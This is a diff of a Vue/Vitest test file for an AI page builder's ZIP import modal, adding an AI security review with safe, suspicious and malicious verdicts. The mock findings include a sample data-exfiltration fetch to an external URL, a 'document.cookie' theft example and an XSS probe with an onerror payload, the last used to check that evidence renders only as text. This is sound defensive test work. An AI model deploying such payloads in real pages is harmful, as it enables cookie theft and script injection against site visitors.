@@ -1,12 +1,45 @@
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
+import { defineComponent, h } from 'vue'
 import { enableAutoUnmount, flushPromises, mount } from '@vue/test-utils'
 import ImportPageModal from '../ImportPageModal.vue'
 import CreatePagePanel from '../CreatePagePanel.vue'
 import { pageKeys, queryClient } from '../../../lib/query-client'
 
-const mocks = vi.hoisted(() => ({ importPage: vi.fn(), push: vi.fn(), status: vi.fn() }))
+const FormKitStub = defineComponent({
+  name: 'FormKit',
+  props: {
+    modelValue: { type: String, default: '' },
+    disabled: Boolean,
+  },
+  emits: ['update:modelValue'],
+  setup(props, { emit }) {
+    return () =>
+      h(
+        'select',
+        {
+          'data-test': 'model-selector',
+          value: props.modelValue,
+          disabled: props.disabled,
+          onChange: (event: Event) =>
+            emit('update:modelValue', (event.target as HTMLSelectElement).value),
+        },
+        [h('option', { value: '' }, '默认模型'), h('option', { value: 'model-a' }, 'Model A')],
+      )
+  },
+})
+
+const mocks = vi.hoisted(() => ({
+  importPage:
+    vi.fn<(request: { body: File; reviewId: string; confirmed?: boolean }) => Promise<unknown>>(),
+  reviewPageImport: vi.fn<(request: { body: File; model?: string }) => Promise<unknown>>(),
+  push: vi.fn<(location: unknown) => unknown>(),
+  status: vi.fn<() => Promise<unknown>>(),
+}))
 vi.mock('../../../api/clients', () => ({
-  aiPageBuilderApi: { importPage: mocks.importPage },
+  aiPageBuilderApi: {
+    importPage: mocks.importPage,
+    reviewPageImport: mocks.reviewPageImport,
+  },
   aiPageBuilderAiApi: { getAiPageBuilderAiStatus: mocks.status },
 }))
 vi.mock('vue-router', () => ({ useRouter: () => ({ push: mocks.push }) }))
@@ -31,12 +64,31 @@ beforeEach(() => {
   vi.restoreAllMocks()
   vi.resetAllMocks()
   queryClient.clear()
+  mocks.reviewPageImport.mockResolvedValue({ data: report('safe') })
   mocks.importPage.mockResolvedValue({ data: { page: { name: 'imported-page' } } })
   mocks.status.mockResolvedValue({ data: { available: true, message: '' } })
 })
 
+function report(
+  verdict: 'safe' | 'suspicious' | 'malicious',
+  findings: Array<Record<string, string>> = [],
+) {
+  return {
+    reviewId: 'review-1',
+    verdict,
+    summary: verdict === 'safe' ? 'AI 未发现明显风险。' : 'AI 发现需要关注的内容。',
+    findings,
+    title: '页面',
+    description: '',
+    themeLayout: false,
+    expiresAt: '2026-10-18T10:00:00Z',
+  }
+}
+
 function modal() {
-  return mount(ImportPageModal)
+  return mount(ImportPageModal, {
+    global: { components: { FormKit: FormKitStub } },
+  })
 }
 function button(wrapper: ReturnType<typeof mount>, text: string) {
   return wrapper.findAll('button').find((node) => node.text() === text)!
@@ -46,15 +98,22 @@ async function select(wrapper: ReturnType<typeof modal>, file: File) {
   Object.defineProperty(input.element, 'files', { value: [file], configurable: true })
   await input.trigger('change')
 }
-async function submit(wrapper: ReturnType<typeof modal>) {
-  await button(wrapper, '导入').trigger('click')
+async function startReview(wrapper: ReturnType<typeof modal>) {
+  await button(wrapper, '开始 AI 审查').trigger('click')
   await flushPromises()
+}
+async function reviewed(wrapper: ReturnType<typeof modal>, file: File) {
+  await select(wrapper, file)
+  await startReview(wrapper)
 }
 
 describe('page archive import', () => {
   it('opens the import modal next to manual creation and cancels it', async () => {
     const wrapper = mount(CreatePagePanel, {
-      global: { stubs: { ChatComposer: true, ManualCreateModal: true } },
+      global: {
+        stubs: { ChatComposer: true, ManualCreateModal: true },
+        components: { FormKit: FormKitStub },
+      },
     })
     await flushPromises()
     const manual = button(wrapper, '手动创建页面')
@@ -67,15 +126,29 @@ describe('page archive import', () => {
     expect(wrapper.findComponent(ImportPageModal).exists()).toBe(false)
   })
 
-  it('imports the selected file, invalidates page queries and opens the returned page', async () => {
+  it('reviews the selected file before importing a safe report', async () => {
     const invalidate = vi.spyOn(queryClient, 'invalidateQueries')
     const wrapper = modal()
-    expect(wrapper.text()).toContain('页面包可能包含 JavaScript 脚本')
+    expect(wrapper.text()).toContain('导入前会先由 AI 审查页面包')
     const file = new File(['zip'], 'page.ZIP', { type: 'application/octet-stream' })
-    await select(wrapper, file)
-    await submit(wrapper)
+    await reviewed(wrapper, file)
+
+    expect(mocks.reviewPageImport).toHaveBeenCalledTimes(1)
+    expect(mocks.reviewPageImport.mock.calls[0]![0].body).toBe(file)
+    expect(mocks.reviewPageImport.mock.calls[0]![0].model).toBeUndefined()
+    expect(mocks.importPage).not.toHaveBeenCalled()
+    expect(wrapper.text()).toContain('AI 审查通过')
+    expect(wrapper.text()).toContain('AI 未发现明显风险。')
+
+    await button(wrapper, '导入页面').trigger('click')
+    await flushPromises()
+
     expect(mocks.importPage).toHaveBeenCalledTimes(1)
-    expect(mocks.importPage.mock.calls[0]![0].body).toBe(file)
+    expect(mocks.importPage.mock.calls[0]![0]).toMatchObject({
+      body: file,
+      reviewId: 'review-1',
+    })
+    expect(mocks.importPage.mock.calls[0]![0].confirmed).toBeUndefined()
     expect(invalidate).toHaveBeenCalledWith({ queryKey: pageKeys.all })
     expect(mocks.push).toHaveBeenCalledWith({
       name: 'AiPageBuilderEditor',
@@ -83,66 +156,178 @@ describe('page archive import', () => {
     })
   })
 
+  it('sends the selected AI model with the review request', async () => {
+    const wrapper = modal()
+    await select(wrapper, new File(['zip'], 'page.zip'))
+    await wrapper.get('[data-test=model-selector]').setValue('model-a')
+    await startReview(wrapper)
+
+    expect(mocks.reviewPageImport.mock.calls[0]![0]).toMatchObject({
+      body: expect.any(File),
+      model: 'model-a',
+    })
+  })
+
+  it('shows the AI Foundation status and hides the model selector when unavailable', () => {
+    const wrapper = mount(ImportPageModal, {
+      props: { aiAvailable: false, aiStatusMessage: 'AI Foundation 未启用' },
+      global: { components: { FormKit: FormKitStub } },
+    })
+
+    expect(wrapper.find('[data-test=model-selector]').exists()).toBe(false)
+    expect(wrapper.text()).toContain('AI Foundation 未启用')
+  })
+
+  it('shows findings and requires confirmation for a suspicious report', async () => {
+    mocks.reviewPageImport.mockResolvedValue({
+      data: report('suspicious', [
+        {
+          severity: 'high',
+          category: 'data_exfiltration',
+          file: 'script.js',
+          evidence: "fetch('https://example.com/collect')",
+          explanation: '脚本会把页面数据发送到外部地址。',
+        },
+      ]),
+    })
+    const wrapper = modal()
+    const file = new File(['zip'], 'page.zip')
+    await reviewed(wrapper, file)
+
+    expect(wrapper.text()).toContain('AI 审查发现风险')
+    expect(wrapper.text()).toContain('高')
+    expect(wrapper.text()).toContain('数据外传')
+    expect(wrapper.text()).toContain('script.js')
+    expect(wrapper.get('pre').text()).toBe("fetch('https://example.com/collect')")
+    expect(wrapper.text()).toContain('脚本会把页面数据发送到外部地址。')
+    expect(button(wrapper, '仍然导入').attributes('disabled')).toBeDefined()
+
+    await wrapper.get('input[type=checkbox]').setValue(true)
+    expect(button(wrapper, '仍然导入').attributes('disabled')).toBeUndefined()
+
+    await button(wrapper, '仍然导入').trigger('click')
+    await flushPromises()
+    expect(mocks.importPage).toHaveBeenCalledTimes(1)
+    expect(mocks.importPage.mock.calls[0]![0]).toMatchObject({
+      body: file,
+      reviewId: 'review-1',
+      confirmed: true,
+    })
+  })
+
+  it('blocks a malicious report and allows reviewing again', async () => {
+    mocks.reviewPageImport.mockResolvedValue({
+      data: report('malicious', [
+        {
+          severity: 'critical',
+          category: 'data_exfiltration',
+          file: 'script.js',
+          evidence: 'document.cookie',
+          explanation: '脚本会窃取访客 Cookie。',
+        },
+      ]),
+    })
+    const wrapper = modal()
+    await reviewed(wrapper, new File(['zip'], 'page.zip'))
+
+    expect(wrapper.text()).toContain('AI 审查判定为恶意页面，禁止导入')
+    const blocked = button(wrapper, '发现恶意内容，无法导入')
+    expect(blocked.attributes('disabled')).toBeDefined()
+    await blocked.trigger('click')
+    await flushPromises()
+    expect(mocks.importPage).not.toHaveBeenCalled()
+
+    await button(wrapper, '重新审查').trigger('click')
+    await flushPromises()
+    expect(mocks.reviewPageImport).toHaveBeenCalledTimes(2)
+  })
+
+  it('shows review failures inline, keeps the file and allows retry', async () => {
+    mocks.reviewPageImport.mockRejectedValueOnce({
+      response: { data: { detail: 'AI 审查不可用，请检查 AI Foundation。' } },
+    })
+    const wrapper = modal()
+    const file = new File(['zip'], 'page.zip')
+    await reviewed(wrapper, file)
+
+    expect(wrapper.get('[role=alert]').text()).toBe('AI 审查不可用，请检查 AI Foundation。')
+    expect(mocks.importPage).not.toHaveBeenCalled()
+    expect(button(wrapper, '开始 AI 审查').attributes('disabled')).toBeUndefined()
+
+    await startReview(wrapper)
+    expect(mocks.reviewPageImport).toHaveBeenCalledTimes(2)
+    expect(wrapper.text()).toContain('AI 审查通过')
+    expect(wrapper.find('[role=alert]').exists()).toBe(false)
+  })
+
   it('does not submit without a file', async () => {
     const wrapper = modal()
-    await submit(wrapper)
-    expect(mocks.importPage).not.toHaveBeenCalled()
+    await startReview(wrapper)
+    expect(mocks.reviewPageImport).not.toHaveBeenCalled()
     expect(wrapper.get('[role=alert]').text()).toBe('请选择 ZIP 文件。')
   })
 
   it.each(['page.txt', 'page.zip.txt', 'page'])('rejects the invalid filename %s', async (name) => {
     const wrapper = modal()
     await select(wrapper, new File(['zip'], name, { type: 'application/zip' }))
-    await submit(wrapper)
-    expect(mocks.importPage).not.toHaveBeenCalled()
+    await startReview(wrapper)
+    expect(mocks.reviewPageImport).not.toHaveBeenCalled()
     expect(wrapper.get('[role=alert]').text()).toBe('请选择 .zip 格式的文件。')
   })
 
   it('rejects files over 4 MiB and accepts the exact size limit after correcting the file', async () => {
     const wrapper = modal()
     await select(wrapper, new File([new Uint8Array(4 * 1024 * 1024 + 1)], 'large.zip'))
-    await submit(wrapper)
-    expect(mocks.importPage).not.toHaveBeenCalled()
+    await startReview(wrapper)
+    expect(mocks.reviewPageImport).not.toHaveBeenCalled()
     expect(wrapper.get('[role=alert]').text()).toBe('ZIP 文件大小不能超过 4 MiB。')
     await select(wrapper, new File([new Uint8Array(4 * 1024 * 1024)], 'page.zip'))
     expect(wrapper.find('[role=alert]').exists()).toBe(false)
-    await submit(wrapper)
-    expect(mocks.importPage).toHaveBeenCalledTimes(1)
+    await startReview(wrapper)
+    expect(mocks.reviewPageImport).toHaveBeenCalledTimes(1)
   })
 
-  it('preserves the file on failure and allows retry without selecting again', async () => {
-    mocks.importPage.mockRejectedValueOnce({ response: { data: { detail: 'ZIP 文件无效' } } })
-    const invalidate = vi.spyOn(queryClient, 'invalidateQueries')
+  it('resets the report when a different file is selected', async () => {
     const wrapper = modal()
-    const file = new File(['zip'], 'page.zip')
-    await select(wrapper, file)
-    await submit(wrapper)
-    expect(wrapper.get('[role=alert]').text()).toBe('ZIP 文件无效')
-    expect(mocks.push).not.toHaveBeenCalled()
-    expect(invalidate).not.toHaveBeenCalled()
-    expect(wrapper.emitted('close')).toBeUndefined()
-    expect(button(wrapper, '导入').attributes('disabled')).toBeUndefined()
-    await submit(wrapper)
-    expect(mocks.importPage).toHaveBeenCalledTimes(2)
-    expect(mocks.importPage.mock.calls[1]![0].body).toBe(file)
-    expect(wrapper.find('[role=alert]').exists()).toBe(false)
-    expect(mocks.push).toHaveBeenCalledTimes(1)
+    await reviewed(wrapper, new File(['zip'], 'page.zip'))
+    expect(wrapper.text()).toContain('AI 审查通过')
+    await select(wrapper, new File(['zip'], 'other.zip'))
+    expect(wrapper.text()).not.toContain('AI 审查通过')
+    expect(button(wrapper, '开始 AI 审查').exists()).toBe(true)
   })
 
-  it('blocks rapid resubmission, file changes, cancel, header close, backdrop and Escape while pending', async () => {
+  it('renders evidence as text and never as HTML', async () => {
+    mocks.reviewPageImport.mockResolvedValue({
+      data: report('suspicious', [
+        {
+          severity: 'medium',
+          category: 'prompt_injection',
+          file: 'page.html',
+          evidence: '<img src=x onerror="alert(1)">',
+          explanation: '内容试图注入 HTML。',
+        },
+      ]),
+    })
+    const wrapper = modal()
+    await reviewed(wrapper, new File(['zip'], 'page.zip'))
+    expect(wrapper.find('img').exists()).toBe(false)
+    expect(wrapper.get('pre').text()).toBe('<img src=x onerror="alert(1)">')
+  })
+
+  it('blocks rapid review resubmission and all close paths while pending', async () => {
     vi.useFakeTimers()
     let resolve!: (value: unknown) => void
-    mocks.importPage.mockReturnValue(new Promise((done) => (resolve = done)))
+    mocks.reviewPageImport.mockReturnValue(new Promise((done) => (resolve = done)))
     const wrapper = modal()
     await select(wrapper, new File(['zip'], 'page.zip'))
-    const importButton = button(wrapper, '导入')
-    const firstClick = importButton.trigger('click')
-    const secondClick = importButton.trigger('click')
+    const reviewButton = button(wrapper, '开始 AI 审查')
+    const firstClick = reviewButton.trigger('click')
+    const secondClick = reviewButton.trigger('click')
     await Promise.all([firstClick, secondClick])
     await flushPromises()
-    expect(mocks.importPage).toHaveBeenCalledTimes(1)
+    expect(mocks.reviewPageImport).toHaveBeenCalledTimes(1)
     expect(wrapper.get('input').attributes('disabled')).toBeDefined()
-    expect(importButton.attributes('disabled')).toBeDefined()
+    expect(reviewButton.attributes('disabled')).toBeDefined()
     expect(button(wrapper, '取消').attributes('disabled')).toBeDefined()
     expect(wrapper.get('[aria-label=关闭]').attributes('disabled')).toBeDefined()
     await button(wrapper, '取消').trigger('click')
@@ -153,11 +338,31 @@ describe('page archive import', () => {
     await vi.advanceTimersByTimeAsync(250)
     expect(wrapper.emitted('close')).toBeUndefined()
     expect(wrapper.get<HTMLElement>('.modal-content').element.style.display).not.toBe('none')
-    resolve({ data: { page: { name: 'imported-page' } } })
+    resolve({ data: report('safe') })
     await flushPromises()
+    await vi.advanceTimersByTimeAsync(0)
     expect(button(wrapper, '取消').attributes('disabled')).toBeUndefined()
     await wrapper.get('[aria-label=关闭]').trigger('click')
     expect(wrapper.emitted('close')).toHaveLength(1)
+  })
+
+  it('blocks rapid import resubmission while pending', async () => {
+    let resolve!: (value: unknown) => void
+    mocks.importPage.mockReturnValue(new Promise((done) => (resolve = done)))
+    const wrapper = modal()
+    await reviewed(wrapper, new File(['zip'], 'page.zip'))
+    vi.useFakeTimers()
+    const importButton = button(wrapper, '导入页面')
+    const firstClick = importButton.trigger('click')
+    const secondClick = importButton.trigger('click')
+    await Promise.all([firstClick, secondClick])
+    await flushPromises()
+    expect(mocks.importPage).toHaveBeenCalledTimes(1)
+    expect(importButton.attributes('disabled')).toBeDefined()
+    expect(button(wrapper, '取消').attributes('disabled')).toBeDefined()
+    resolve({ data: { page: { name: 'imported-page' } } })
+    await flushPromises()
+    expect(mocks.push).toHaveBeenCalledTimes(1)
   })
 
   it('allows Escape to close the idle modal', async () => {
